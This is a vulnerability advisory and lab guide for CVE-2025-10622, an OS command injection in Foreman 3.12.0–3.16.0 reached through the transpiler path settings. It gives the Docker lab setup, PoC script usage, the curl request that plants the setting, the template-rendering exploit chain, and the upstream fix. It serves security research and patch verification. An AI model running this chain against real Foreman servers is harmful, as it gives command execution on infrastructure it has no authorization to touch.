# CVE-2025-10622 - Foreman OS Command Injection via Transpiler Settings

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel)

## Vulnerability Summary

| Field       | Value |
|-------------|-------|
| CVE         | CVE-2025-10622 |
| Component   | [Foreman](https://theforeman.org/) (Red Hat Satellite component) |
| Type        | CWE-78: OS Command Injection, CWE-602: Client-Side Enforcement of Server-Side Security |
| CVSS        | 8.0 (High) — `CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H` |
| EPSS        | 0.1% (29.9th percentile) |
| Affected    | Foreman 3.12.0 through 3.16.0 (inclusive) |
| Fix         | 3.15.1 / 3.16.1 / 3.17.0 — commit [`49dd222`](https://github.com/theforeman/foreman/commit/49dd22221ed4ba4d7687e3e7406d8ae975a2ffa9) |
| Author      | Exploit Intelligence Platform |
| Date        | 2026-02-27 |

## Vulnerability Details

CVE-2025-10622 is an OS command injection vulnerability in [Foreman](https://theforeman.org/) versions 3.12.0 through 3.16.0, a lifecycle management tool for physical and virtual servers (and a core component of Red Hat Satellite). An authenticated administrator can bypass client-side-only whitelist validation of the CoreOS/Fedora CoreOS transpiler path settings (`ct_location` / `fcct_location`) via the REST API or GraphQL, then trigger arbitrary command execution as the Foreman process user through template rendering.

## Root Cause

The `ct_location` and `fcct_location` settings control the filesystem path to the CoreOS and Fedora CoreOS transpiler binaries. These settings are defined in `config/initializers/f_foreman_settings_provisioning.rb` with a `collection` parameter that restricts the options in the UI dropdown to whitelisted paths (`/usr/bin/ct`, `/usr/local/bin/ct`, `/usr/bin/fcct`, `/usr/local/bin/fcct`). However, this `collection` parameter is **only enforced on the client side** — the server accepts and persists any value submitted through the REST API (`PUT /api/v2/settings/ct_location`) or GraphQL (`updateSetting` mutation) without validation.

When a provisioning template calls `transpile_coreos_linux_config()` or `transpile_fedora_coreos_config()`, the attacker-controlled setting value is read, assembled into a command array, and passed to `Foreman::CommandRunner`, which executes it via Ruby's `Open3.capture3`. The `CommandRunner` only checks that the path is absolute, exists, and is executable — any system binary satisfies these checks, enabling arbitrary command execution under the Foreman process user. This also bypasses Foreman's safe mode template rendering restrictions.

## Lab Setup

### Prerequisites

- Docker with Compose plugin installed
- ~4 GB RAM available for containers
- Internet access (to pull base images on first build)

### Build and Start

```bash
cd CVE-2025-10622
docker compose build
docker compose up -d
```

> **Note:** First startup takes approximately 2-3 minutes while the database is initialized, migrations run, and the admin user is seeded. Wait for the app container health check to pass before proceeding.

### Verify Lab is Ready

```bash
# Get the app container IP (for Docker-in-Docker environments)
APP_IP=$(docker inspect cve-2025-10622-app --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')

# Check Foreman is running
curl -s -u admin:changeme "http://${APP_IP}:3000/api/v2/status" | jq .
```

Expected output:
```json
{
  "result": "ok",
  "status": 200,
  "version": "3.16.0",
  "api_version": 2
}
```

### Container Architecture

| Container | Image | Role | Port |
|-----------|-------|------|------|
| `cve-2025-10622-app` | `lab-app` (from `quay.io/foreman/foreman:3.16.0`) | Foreman 3.16.0 Rails application | 3000 |
| `cve-2025-10622-db` | `postgres:12` | PostgreSQL database | 5432 |
| `cve-2025-10622-redis-cache` | `redis:7` | Redis for Rails caching | 6379 |
| `cve-2025-10622-redis-tasks` | `redis:7` | Redis for Dynflow/Sidekiq task queue | 6379 |

### Credentials

- **Web UI / API**: `admin` / `changeme`
- **Database**: `foreman` / `foreman`

### Stop / Reset

```bash
# Stop the lab
docker compose down

# Full reset (removes database volume)
docker compose down -v
```

## PoC Usage

Two PoC scripts are provided, demonstrating independent attack paths:

### Primary PoC: `poc.py` — ct_location via REST API

Exploits the `ct_location` setting via the REST API v2 and triggers command execution through the Report Templates API.

```bash
# Get target IP
APP_IP=$(docker inspect cve-2025-10622-app --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')

# Run with default command (/usr/bin/id)
python3 poc/poc.py $APP_IP

# Run with custom command
python3 poc/poc.py $APP_IP 3000 admin changeme /usr/bin/id
python3 poc/poc.py $APP_IP 3000 admin changeme /usr/bin/whoami
python3 poc/poc.py $APP_IP 3000 admin changeme /usr/bin/hostname
```

**Arguments:**
| Argument | Default | Description |
|----------|---------|-------------|
| `target_host` | *(required)* | IP or hostname of the Foreman instance |
| `port` | `3000` | Foreman web server port |
| `username` | `admin` | Foreman username with `edit_settings` permission |
| `password` | `changeme` | Password for the user |
| `command` | `/usr/bin/id` | Absolute path to executable to run |

### Variant PoC: `poc_fcct_graphql.py` — fcct_location via GraphQL

Exploits the `fcct_location` setting via the GraphQL mutation API, demonstrating that both settings and both API interfaces are vulnerable.

```bash
python3 poc/poc_fcct_graphql.py $APP_IP 3000 admin changeme
```

### Expected Output (Vulnerable — Foreman 3.16.0)

```
======================================================================
CVE-2025-10622: Foreman OS Command Injection via ct_location
======================================================================
Target: http://172.22.0.5:3000
Auth:   admin:********
Command: /usr/bin/id
======================================================================
[*] Step 0: Checking target Foreman instance...
[+] Foreman 3.16.0 detected (status: ok)
[+] Version 3.16.0 is in the vulnerable range (3.12.0 - 3.16.0)

[*] Step 1: Setting ct_location to '/usr/bin/id' via API...
    [+] SUCCESS: ct_location changed to '/usr/bin/id'
    [+] Server accepted arbitrary path - NO server-side validation!

[*] Step 2: Creating trigger template with transpiler macro...
    [+] Template created with ID: 210

[*] Step 3: Generating template to trigger command execution...

    ============================================================
    COMMAND OUTPUT:
    ============================================================
    | uid=998(foreman) gid=998(foreman) groups=998(foreman)
    ============================================================

[+] EXPLOIT SUCCESSFUL!
[+] Arbitrary command '/usr/bin/id' executed as the Foreman process user

[*] Cleanup: Restoring original settings...
    [+] Deleted PoC template (ID: 210)
    [+] Restored ct_location to '/usr/bin/ct'
```

## Verification: Vulnerable vs. Patched

### Vulnerable (Foreman ≤ 3.16.0)

Setting `ct_location` to an arbitrary path via the API succeeds:

```bash
curl -u admin:changeme -X PUT -H "Content-Type: application/json" \
  -d '{"setting": {"value": "/usr/bin/id"}}' \
  "http://${APP_IP}:3000/api/v2/settings/ct_location"
```

**Response**: HTTP 200 — setting accepted, value changed to `/usr/bin/id`.

### Patched (Foreman ≥ 3.15.1, 3.16.1, 3.17.0)

The same API call is rejected with server-side validation:

```bash
curl -u admin:changeme -X PUT -H "Content-Type: application/json" \
  -d '{"setting": {"value": "/usr/bin/id"}}' \
  "http://${APP_IP}:3000/api/v2/settings/ct_location"
```

**Response**: HTTP 422 — validation error:
```json
{
  "error": {
    "message": "Validation failed: Invalid ct location, use settings.yaml for arbitrary location"
  }
}
```

## Exploit Chain (Technical Detail)

```
┌─────────────────────────────────────────────────────────────┐
│ 1. Attacker (admin user)                                    │
│    PUT /api/v2/settings/ct_location                         │
│    Body: {"setting": {"value": "/usr/bin/id"}}              │
│    ─────────────────────────────────────────────────────►    │
│    Server accepts — NO server-side whitelist validation      │
├─────────────────────────────────────────────────────────────┤
│ 2. Attacker creates a report template                       │
│    POST /api/v2/report_templates                            │
│    Template: <%= transpile_coreos_linux_config("---") %>     │
├─────────────────────────────────────────────────────────────┤
│ 3. Attacker triggers template rendering                     │
│    POST /api/v2/report_templates/:id/generate               │
│    ─────────────────────────────────────────────────────►    │
│    transpile_coreos_linux_config()                           │
│      → Setting[:ct_location] reads "/usr/bin/id"            │
│      → CommandRunner.new(["/usr/bin/id"], input).run!        │
│      → Open3.capture3("/usr/bin/id", stdin_data: input)     │
│      → Returns: uid=998(foreman) gid=998(foreman) ...       │
│    ◄─────────────────────────────────────────────────────    │
│    Command output returned in HTTP response                  │
└─────────────────────────────────────────────────────────────┘
```

### Key Vulnerable Files

| File | Role |
|------|------|
| `config/initializers/f_foreman_settings_provisioning.rb` | Defines `ct_location`/`fcct_location` with client-side-only whitelist |
| `app/services/foreman/renderer/scope/macros/transpilers.rb` | Template macros that execute the setting value as a command |
| `lib/foreman/command_runner.rb` | Command execution via `Open3.capture3` — only checks path exists |
| `app/controllers/api/v2/settings_controller.rb` | REST API for modifying settings (no per-setting validation) |
| `app/graphql/mutations/settings/update.rb` | GraphQL mutation (same lack of validation) |

## Fix

### Upstream Fix

**Commit**: [`49dd222`](https://github.com/theforeman/foreman/commit/49dd22221ed4ba4d7687e3e7406d8ae975a2ffa9)
**Author**: Evgeni Golov
**PR**: [#10750](https://github.com/theforeman/foreman/pull/10750) (Fixes #38885)

The fix adds **server-side validation** for both settings in `config/initializers/f_foreman_settings_provisioning.rb`:

```ruby
validates('ct_location',
  ->(value) { value.blank? || CT_LOCATIONS.include?(value) },
  message: N_("Invalid ct location, use settings.yaml for arbitrary location"))

validates('fcct_location',
  ->(value) { value.blank? || FCCT_LOCATIONS.include?(value) },
  message: N_("Invalid fcct location, use settings.yaml for arbitrary location"))
```

This ensures the setting value must be either blank or one of the whitelisted paths. The validation applies to both REST API and GraphQL mutations through the shared `Setting` model. The fix uses a strict `include?` check that cannot be bypassed with path traversal or encoding tricks.

### Fix Assessment

The fix is **effective** for the primary attack vector. The server now rejects any value not in the whitelist. No bypass was identified.

## References

| Source | URL |
|--------|-----|
| Foreman Security Advisory | https://theforeman.org/security.html#2025-10622 |
| Red Hat CVE Page | https://access.redhat.com/security/cve/CVE-2025-10622 |
| Red Hat Bugzilla | https://bugzilla.redhat.com/show_bug.cgi?id=2396020 |
| Foreman Issue Tracker | https://projects.theforeman.org/issues/38885 |
| Fix PR (develop) | https://github.com/theforeman/foreman/pull/10750 |
| Backport PR (3.16.x) | https://github.com/theforeman/foreman/pull/10751 |
| Backport PR (3.15.x) | https://github.com/theforeman/foreman/pull/10752 |
| GHSA Advisory | https://github.com/advisories/GHSA-f5h4-c4jw-c4gm |
| RHSA-2025:19721 | https://access.redhat.com/errata/RHSA-2025:19721 |
| RHSA-2025:19832 | https://access.redhat.com/errata/RHSA-2025:19832 |

## Timeline

| Date | Event |
|------|-------|
| 2025-09-25 | Fix committed to Foreman develop branch |
| 2025-09-25 | Backport PRs created for 3.16.x and 3.15.x branches |
| — | Foreman 3.15.1, 3.16.1, 3.17.0 released with fix |
| — | Red Hat Security Advisories published (RHSA-2025:19721, RHSA-2025:19832) |

## Project Structure

```
CVE-2025-10622/
├── README.md                  # Main advisory and reproduction guide
├── intel_brief.md             # CVE intelligence brief
├── vulnerability_analysis.md  # Root cause analysis
├── lab_build_report.md        # Lab build documentation
├── poc_verification_report.md # PoC test results
├── docker-compose.yml         # Container orchestration
├── Dockerfile.vulnerable      # Vulnerable Foreman 3.16.0 image
├── database.yml               # PostgreSQL connection config
├── entrypoint-init.sh         # Auto-init entrypoint script
└── poc/                       # Proof-of-concept exploits
    ├── poc.py                 # Primary PoC (ct_location + REST API)
    └── poc_fcct_graphql.py    # Variant PoC (fcct_location + GraphQL)
```

## Disclaimer

This proof-of-concept is provided for **authorized security testing and educational purposes only**. Use of this tool against systems without explicit written permission is illegal and unethical. The authors assume no liability for misuse. Always follow responsible disclosure practices and applicable laws.

This PoC was generated by the Exploit Intelligence Platform.
